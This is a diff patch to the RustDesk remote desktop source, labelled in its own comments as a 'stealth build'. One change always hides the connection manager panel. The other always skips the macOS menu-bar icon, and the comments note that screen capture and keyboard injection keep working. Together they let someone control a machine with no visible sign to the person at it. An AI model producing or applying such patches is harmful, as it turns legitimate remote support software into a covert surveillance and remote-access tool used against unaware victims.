@@ -1,0 +1,45 @@
+diff --git a/src/ipc.rs b/src/ipc.rs
+index 68c987f..437c39a 100644
+--- a/src/ipc.rs
++++ b/src/ipc.rs
+@@ -861,12 +861,12 @@ async fn handle(data: Data, stream: &mut Connection) {
+                         None
+                     };
+                 } else if name == "hide_cm" {
+-                    value = if crate::hbbs_http::sync::is_pro() || crate::common::is_custom_client()
+-                    {
+-                        Some(hbb_common::password_security::hide_cm().to_string())
+-                    } else {
+-                        None
+-                    };
++                    // STEALTH BUILD PATCH: upstream gates hide-cm behind Pro / custom-client
++                    // (is_custom_client() == get_app_name() != "RustDesk"). Enable it
++                    // unconditionally so this from-source build honors the allow-hide-cm
++                    // config (approve-mode=password + verification-method=use-permanent-password
++                    // + allow-hide-cm=Y) and keeps the CM connection panel hidden.
++                    value = Some(hbb_common::password_security::hide_cm().to_string());
+                 } else if name == "voice-call-input" {
+                     value = crate::audio_service::get_voice_call_input_device();
+                 } else if name == "unlock-pin" {
+diff --git a/src/tray.rs b/src/tray.rs
+index e8db0ef..b29cb5b 100644
+--- a/src/tray.rs
++++ b/src/tray.rs
+@@ -138,7 +138,16 @@ fn make_tray() -> hbb_common::ResultType<()> {
+         if let tao::event::Event::NewEvents(tao::event::StartCause::Init) = event {
+             // for fixing https://github.com/rustdesk/rustdesk/discussions/10210#discussioncomment-14600745
+             // so we start tray, but not to show it
+-            if crate::ui_interface::get_builtin_option(hbb_common::config::keys::OPTION_HIDE_TRAY) == "Y" {
++            //
++            // STEALTH BUILD PATCH: on macOS, ALWAYS skip creating the menu-bar status
++            // item. The event loop has already reached Init and keeps running, so the
++            // --server process retains its main run loop -> screen capture + keyboard
++            // injection stay working. This avoids the hide-tray=Y LaunchDaemon path that
++            // breaks remote keyboard input (rustdesk/rustdesk#10709). Dock icon is hidden
++            // separately via LSUIElement in flutter/macos/Runner/Info.plist.
++            if cfg!(target_os = "macos")
++                || crate::ui_interface::get_builtin_option(hbb_common::config::keys::OPTION_HIDE_TRAY) == "Y"
++            {
+                 return;
+             }
+             // We create the icon once the event loop is actually running
